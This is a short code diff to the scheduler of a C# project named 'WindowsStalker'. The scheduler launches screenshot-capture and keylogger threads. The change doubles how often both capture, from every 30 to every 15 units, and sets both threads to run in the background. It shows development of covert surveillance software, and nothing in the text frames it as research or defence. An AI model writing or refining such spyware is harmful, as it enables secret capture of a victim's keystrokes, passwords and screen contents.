@@ -6,8 +6,8 @@ namespace WindowsStalker
 {
     public class Scheduler
     {
-        private int _screenshotPeriod = 30;
-        private int _keyloggerPeriod = 30;
+        private int _screenshotPeriod = 15;
+        private int _keyloggerPeriod = 15;
         private Thread _captureThread;
         private volatile bool _shouldStop;
 
@@ -70,12 +70,14 @@ namespace WindowsStalker
         private void StartScreenshotThread()
         {
             Thread screenshotThread = new Thread(ScreenCapture.CaptureScreenshot);
+            screenshotThread.IsBackground = true;
             screenshotThread.Start();
         }
 
         private void StartKeyloggerThread()
         {
             Thread keyloggerThread = new Thread(Keylogger.LogKeys);
+            keyloggerThread.IsBackground = true;
             keyloggerThread.Start();
         }
     }
